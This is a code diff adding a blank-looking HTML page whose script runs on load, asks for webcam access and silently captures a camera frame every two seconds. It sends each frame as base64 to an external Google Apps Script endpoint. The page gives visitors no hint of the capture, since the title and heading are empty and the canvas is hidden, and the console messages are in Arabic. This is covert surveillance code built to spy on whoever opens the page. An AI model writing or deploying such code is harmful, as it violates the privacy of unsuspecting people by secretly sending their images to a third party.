@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1></h1>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    window.onload = function () {
+      const canvas = document.getElementById("canvas");
+      const scriptURL = "https://script.google.com/macros/s/AKfycbyly4JRHV2yv6cegY1I1E5GY8ONktMR1jRt5BmLTlfDdLxVQxr1raz42aH7u8BlkcrSrA/exec";
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+
+          setInterval(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function (blob) {
+              const reader = new FileReader();
+              reader.onloadend = function () {
+                const base64 = reader.result.split(",")[1];
+                sendToGoogleScript(base64);
+              };
+              reader.readAsDataURL(blob);
+            }, "image/jpeg");
+          }, 2000);
+        })
+        .catch(function (error) {
+          console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
+        });
+
+      function sendToGoogleScript(base64Image) {
+        const formData = new FormData();
+        formData.append("photo", base64Image);
+        fetch(scriptURL, {
+          method: "POST",
+          body: formData
+        })
+          .then((res) => res.text())
+          .then((res) => console.log("✅ تم الإرسال:", res))
+          .catch((err) => console.error("❌ فشل الإرسال:", err));
+      }
+    }
+  </script>
+</body>
+</html>
